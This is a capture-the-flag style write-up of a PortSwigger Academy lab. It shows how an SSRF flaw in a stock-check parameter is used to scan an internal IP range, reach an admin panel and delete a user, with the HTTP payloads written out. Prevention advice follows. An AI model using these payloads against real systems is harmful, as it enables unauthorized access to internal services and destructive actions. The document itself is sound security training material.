# Basic SSRF Against Another Back-End System

## Lab Description

This lab contains a stock check feature that retrieves stock information from an internal system. The application is vulnerable to **Server-Side Request Forgery (SSRF)** because it allows users to control the URL that the server requests.

**Goal:** Discover the internal admin interface running on the `192.168.0.X` range and delete the user `carlos`.

---

## Understanding the Vulnerability

The stock checker sends a request to a URL specified in the `stockApi` parameter.

Instead of requesting a legitimate stock endpoint, an attacker can modify this parameter and force the server to make requests to internal systems that are not accessible from the internet.

Since the request originates from the server itself, it can access internal network resources.

---

## Original Request

```http
POST /product/stock HTTP/2
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
```

Decoded value:

```text
http://192.168.0.1:8080/product/stock/check?productId=2&storeId=1
```

---

## Exploitation Steps

### 1. Intercept the Request

Capture the stock check request using Burp Suite.

### 2. Scan Internal IP Addresses

Modify the `stockApi` parameter and iterate through the internal range:

```text
http://192.168.0.1:8080
http://192.168.0.2:8080
http://192.168.0.3:8080
...
http://192.168.0.255:8080
```

Burp Intruder can be used to automate this process.

### 3. Identify the Admin Interface

While scanning, one IP returned a redirect response:

```http
HTTP/2 302 Found
Location: http://192.168.0.42:8080/admin
```

This indicates that the admin panel is located at:

```text
http://192.168.0.42:8080/admin
```

### 4. Access the Admin Panel

Update the parameter:

```text
stockApi=http://192.168.0.42:8080/admin
```

The server fetches the admin page and returns its contents.

### 5. Delete User Carlos

Inspecting the admin page reveals a delete-user endpoint:

```text
http://192.168.0.42:8080/admin/delete?username=carlos
```

Send the following SSRF payload:

```http
POST /product/stock HTTP/2
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://192.168.0.42:8080/admin/delete?username=carlos
```

---

## Successful Response

```http
HTTP/2 302 Found
Location: http://192.168.0.42:8080/admin
```

The request is executed by the vulnerable server, and the user `carlos` is deleted.

---

## Root Cause

The application accepts a user-controlled URL and sends a server-side request without validating the destination.

Because internal network addresses are not restricted, an attacker can use the server as a proxy to:

* Access internal services
* Reach admin panels
* Interact with internal APIs
* Perform unauthorized actions

---

## Impact

* Internal network exposure
* Access to administrative interfaces
* Sensitive information disclosure
* Potential remote code execution in some environments
* Unauthorized actions on internal systems

---

## Prevention

* Validate and sanitize user-supplied URLs
* Use an allowlist of trusted domains
* Block requests to private IP ranges
* Restrict access to localhost and internal addresses
* Implement network-level egress filtering

---

## Key Learning

SSRF occurs when a server blindly trusts a user-supplied URL and performs requests on the user's behalf. In this lab, the vulnerability allowed access to an internal admin interface and ultimately enabled deletion of the user `carlos`.

---
## Resource
* PortSiwgger-Academy
